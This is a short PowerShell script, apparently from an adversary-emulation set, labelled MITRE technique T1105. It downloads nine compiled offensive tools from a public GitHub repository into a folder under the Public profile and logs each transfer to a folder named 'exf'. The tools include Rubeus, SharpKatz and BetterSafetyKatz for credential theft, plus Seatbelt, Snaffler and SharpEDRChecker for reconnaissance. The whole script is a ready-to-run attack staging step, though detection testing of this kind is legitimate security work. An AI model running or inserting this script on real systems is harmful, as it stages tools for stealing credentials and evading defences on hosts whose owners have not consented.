# Downloads several compiled attack tools
# Technic ID : T1105
Clear-Host
Write-Output "==============================================================================="
Write-Output "Downloads several compiled attack tools (T1105)"
Write-Output "==============================================================================="
#
$DownloadLogFile = "$env:PUBLIC\exf\Tools_Download.txt";
$DestinationPath = "$env:PUBLIC\Toolz\";
$SoftToDownload = @("Seatbelt.exe","Rubeus.exe","SauronEye.exe","SharpKatz.exe","BetterSafetyKatz.exe","Moriarty.exe","SharpEDRChecker.exe","Snaffler.exe","SharpUp.exe");
foreach ($Tool in $SoftToDownload) 
{
    Write-host $Tool;
    $DownloadRun = "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/$Tool";
    $DestinationFilename = "$DestinationPath$Tool";
    $web = (New-Object System.Net.WebClient);
    $result = $web.DownloadFile("$DownloadRun", "$DestinationFileName");
    Write-Output "The file $Tool has been successfully downloaded from $DownloadRun and stored to $DestinationFilename" | Out-File -FilePath "$DownloadLogFile" -Append;
  }